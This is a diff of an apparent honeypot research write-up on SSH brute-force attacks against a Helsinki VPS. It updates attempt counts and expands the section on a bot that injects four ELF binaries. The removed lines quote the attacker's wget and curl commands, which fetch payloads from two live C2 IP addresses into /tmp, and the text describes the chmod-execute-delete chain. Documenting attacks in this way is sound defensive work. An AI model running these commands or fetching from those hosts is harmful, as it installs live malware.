@@ -1,13 +1,13 @@
-# Findings -- 95h on a public VPS
+# Findings -- 97h on a public VPS
 
 Helsinki VPS, port 22, fresh IP, no prior reputation.
-Data: 2026-05-26 11:32 UTC to 2026-05-30 12:00 UTC.
+Data: 2026-05-26 11:32 UTC to 2026-05-30 13:27 UTC.
 
 ```
-3306 auth attempts
- 181 unique source IPs
+3317 auth attempts
+ 183 unique source IPs
 1928 unique passwords tried
- 510 sessions accepted
+ 529 sessions accepted
 ```
 
 ---
@@ -21,7 +21,7 @@ Not continuous. Two big waves, one quiet day.
 2026-05-27  545 commands  -- Diicot heavy day
 2026-05-28   10 commands  -- quiet
 2026-05-29   90 commands  -- threshold=1 deployed, new families appear
-2026-05-30   --           -- new deploy, family 10 in 17min
+2026-05-30  43342 commands -- family 10 live session, 78min, 4 binaries
 ```
 
 Peak: 22:00 UTC, 1270 attempts in one hour (2026-05-27).
@@ -228,34 +228,40 @@ a first-stage probe before a payload bot follows up.
 
 ### 10. ELF echo injector
 
-2026-05-30 11:18. Appeared 17 minutes after deploying the new binary.
+Single session eb342541b5, 2026-05-30 12:18-13:36 Rabat (78 minutes).
+Source IP: 152.89.61.139 (Ukraine). Appeared 17 minutes after deploying the new binary.
 
-```bash
-uname -s
-uname -m
-cd /tmp; rm -f amd64; wget -t 1 http://195.177.94.72:564/b/amd64
-cd /tmp; curl -O --connect-timeout 10 http://195.177.94.72:564/b/amd64
-cd /tmp; rm -f amd64; wget -t 1 http://45.88.91.135:35146/b/amd64
-cd /tmp; curl -O --connect-timeout 10 http://45.88.91.135:35146/b/amd64
-echo -e -n "\x7f\x45\x4c\x46..."    # 407 times
+Four binaries, injected in sequence. Each one: arch check, try wget then curl from two
+C2 servers, fall back to hex echo injection when downloads fail, chmod 777, execute,
+delete, then move to the next binary.
+
+```
+amd64  -- 5MB, 64-bit Go, stripped
+kal64  -- 3MB, 64-bit Go, stripped
+kswpad -- 1.2MB, ELF 32-bit x86
+linux  -- 1.3MB, ELF 32-bit x86, UPX packed
 ```
 
-Arch check first. Then tries to download `amd64` from two C2 servers with wget+curl
-fallback on each. When downloads fail (our fake wget returns errors), it writes the
-entire binary as hex bytes via 407 echo commands -- ~6.5KB ELF executable reconstructed
-from shell commands alone.
+C2 servers tried:
+- 195.177.94.72:564
+- 45.88.91.135:35146
+
+Both refused connections (fake wget returns errors). So the bot wrote all four binaries
+as hex via 43,058 `echo -e -n` chunks -- the entire payload delivered inside the SSH
+session itself.
 
 `\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.
 
-This is called in-band payload delivery -- the payload travels inside the attack itself,
-no separate download needed. Used when outbound HTTP is blocked. The bot carries its
-payload in memory and falls back to hex injection when the network is closed.
+This is in-band payload delivery -- the payload travels inside the attack, no separate
+download needed. Used when outbound HTTP is blocked. The bot carries its full toolkit
+in memory and reconstructs it on the target via shell.
 
-On a real server it would then `chmod +x /tmp/amd64 && /tmp/amd64`. We didn't capture
-that -- the fake shell returned success on the echo commands but there's nothing to execute.
+All four were chmod 777'd, executed, and deleted. Session ended at 13:36 after `linux`
+was deleted. 43,058 echo commands total.
 
-URL logging confirmed working: both C2 URLs (`195.177.94.72:564` and
-`45.88.91.135:35146`) appeared in session.log 17 minutes after deploy.
+Binary analysis pending -- all four recoverable from session.log hex chunks, also
+downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
+Ghidra work yet.
 
 ---
 
@@ -298,9 +304,9 @@ captured within 17 minutes of deploying.
 
 **The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.
 
-**The 4 binaries from the ELF injector session** -- I can reconstruct them from session.log
-(the hex chunks are all there), and can also download them directly from the C2 servers which
-are still live. But I haven't done a proper analysis yet.
+**The 4 binaries from the ELF injector session** -- recoverable from session.log hex chunks,
+also downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
+analysis yet.
 
 **Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.
 
